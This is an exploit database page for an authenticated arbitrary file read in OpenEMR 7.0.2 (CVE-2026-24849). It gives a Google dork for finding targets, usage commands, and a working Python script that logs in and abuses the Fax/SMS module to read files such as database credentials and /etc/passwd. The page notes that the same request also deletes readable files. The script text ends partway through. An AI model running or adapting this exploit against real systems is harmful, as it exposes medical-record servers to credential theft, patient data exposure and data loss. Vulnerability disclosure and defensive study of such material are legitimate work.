---
title: OpenEMR 7.0.2 Arbitrary File Read
url: https://cxsecurity.com/issue/WLB-2026060009
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-06-15
fetch_date: 2026-06-16T07:14:39.877429
---

# OpenEMR 7.0.2 Arbitrary File Read

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **OpenEMR 7.0.2 Arbitrary File Read** **2026.06.15**  Credit:  **[doany1](https://cxsecurity.com/author/doany1/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-24849](https://cxsecurity.com/cveshow/CVE-2026-24849/ "Click to see CVE-2026-24849")**  CWE: **[CWE-22](https://cxsecurity.com/cwe/CWE-22 "Click to see CWE-22")  [CWE-200](https://cxsecurity.com/cwe/CWE-200 "Click to see CWE-200")**  **[**Dork:** intitle:"OpenEMR" inurl:"interface/login/login.php"](https://cxsecurity.com/dorks/)** | |

# Exploit Title: OpenEMR 7.0.2 - Arbitrary File Read
# Google Dork: intitle:"OpenEMR" inurl:"interface/login/login.php"
# Date: 2026-06-06
# Exploit Author: doany1
# Vendor Homepage: https://www.open-emr.org/
# Software Link: https://sourceforge.net/projects/openemr/files/OpenEMR%20Current/7.0.2/openemr-7.0.2.tar.gz/download
# Version: OpenEMR < 7.0.4 (tested on 7.0.2)
# Tested on: Ubuntu 22.04 / PHP 8.1 / Apache 2.4 (OpenEMR 7.0.2)
# CVE : CVE-2026-24849
# CWE : CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)
#
# Description:
# The Fax/SMS module's EtherFaxActions::disposeDoc() method
# (interface/modules/custom\_modules/oe-module-faxsms) reads a caller-supplied
# `file\_path` request parameter and passes it straight to readfile() with no
# path validation. The method never calls authenticate(), so the only thing
# required to reach it is a valid OpenEMR session.
#
# Privilege required:
# ANY authenticated user -- this is NOT an admin-only bug. A low-privilege
# account (receptionist, clinician, etc.) can read any file the web-server
# user can reach: sites/default/sqlconf.php (DB credentials), /etc/passwd,
# application source, and so on. The admin/pass values in the examples below
# are only convenient demo credentials, not a requirement of the bug.
#
# Prerequisites:
# - Any valid OpenEMR login (no privileges required).
# - The Fax/SMS module enabled with EtherFax selected as the fax provider
# (the file read does NOT require a real EtherFax account).
#
# WARNING (destructive):
# disposeDoc() calls unlink() on the target \*after\* reading it. Reading a file
# that the web-server user is allowed to delete WILL remove it. Prefer
# root-owned targets (e.g. /etc/passwd) whose parent directory the web user
# cannot write, so the unlink() fails and the file survives.
#
# References:
# https://github.com/openemr/openemr/security/advisories/GHSA-w6vc-hx2x-48pc
# https://nvd.nist.gov/vuln/detail/CVE-2026-24849
#
# Usage:
# Interactive (prompts for everything):
# python3 exploit-CVE-2026-24849.py
# Non-interactive:
# python3 exploit-CVE-2026-24849.py -t http://10.10.10.10 -u admin -P pass \
# -f /var/www/html/openemr/sites/default/sqlconf.php
import argparse
import getpass
import re
import sys
try:
import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable\_warnings(InsecureRequestWarning)
except ImportError:
sys.exit("[-] This exploit needs the 'requests' module: pip3 install requests")
UA = "Mozilla/5.0 (X11; Linux x86\_64; rv:115.0) Gecko/20100101 Firefox/115.0"
FAXSMS = "/interface/modules/custom\_modules/oe-module-faxsms/index.php"
# Method name varies across affected minor versions (disposeDoc <-> disposeDocument).
ACTIONS = ["disposeDoc", "disposeDocument"]
# An unauthenticated request is answered with a JS redirect to this path.
# (Use a narrow marker: every OpenEMR page embeds generic timeout JS.)
FAIL\_MARKER = "login\_screen.php?error=1"
def ask(prompt, default=None, secret=False):
label = "%s [%s]: " % (prompt, default) if default else "%s: " % prompt
value = getpass.getpass(label) if secret else input(label).strip()
return value or default
def login(sess, base, site, user, password):
"""Establish an OpenEMR session in `sess`. Validity is confirmed later by an
actual file read, so this just performs the GET (CSRF prime) + POST."""
# 1) prime a session cookie and grab the CSRF token if the form exposes one
r = sess.get(base + "/interface/login/login.php",
params={"site": site}, timeout=20, verify=False)
m = re.search(r"csrf\_token\_form.\*?value=([\"'])(.\*?)\1", r.text, re.S)
data = {
"new\_login\_session\_management": "1",
"authProvider": "Default",
"authUser": user,
"clearPass": password,
"languageChoice": "1",
}
if m: # OpenEMR doesn't enforce it on this POST, but send it when present
data["csrf\_token\_form"] = m.group(2)
# 2) authenticate
sess.post(base + "/interface/main/main\_screen.php",
params={"auth": "login", "site": site},
data=data, timeout=20, verify=False)
def read\_file(sess, base, site, remote\_path):
"""Return (content, status). status in {ok, session, missing}."""
for action in ACTIONS:
r = sess.get(base + FAXSMS,
params={"site": site, "type": "fax",
"\_ACTION\_COMMAND": action,
"file\_path": remote\_path, "action": "download"},
timeout=20, verify=False)
body = r.text
if FAIL\_MARKER in body:
return None, "session"
if "Problem with download" in body:
return None, "missing" # method ran, file absent/unreadable
if body.strip() == "":
continue # likely wrong method name -> try next
return body, "ok"
return None, "missing"
def main():
ap = argparse.ArgumentParser(
description="OpenEMR < 7.0.4 authenticated arbitrary file read (CVE-2026-24849)")
ap.add\_argument("-t", "--target", help="Base URL, e.g. http://10.10.10.10")
ap.add\_argument("-u", "--user", help="OpenEMR username (default: admin)")
ap.add\_argument("-P", "--password", help="OpenEMR password")
ap.add\_argument("-s", "--site", help="OpenEMR site (default: default)")
ap.add\_argument("-f", "--file", help="Absolute path of the remote file to read")
ap.add\_argument("-o", "--output", help="Save looted file here instead of printing")
args = ap.parse\_args()
print("[\*] OpenEMR < 7.0.4 - Authenticated Arbitrary File Read (CVE-2026-24849)\n")
target = args.target or ask("Target base URL (e.g. http://10.10.10.10)")
if not target:
sys.exit("[-] Target is required.")
target = target.rstrip("/")
if not target.startswith("http"):
target = "http://" + target
user = args.user or ask("Username", default="admin")
password = args.password...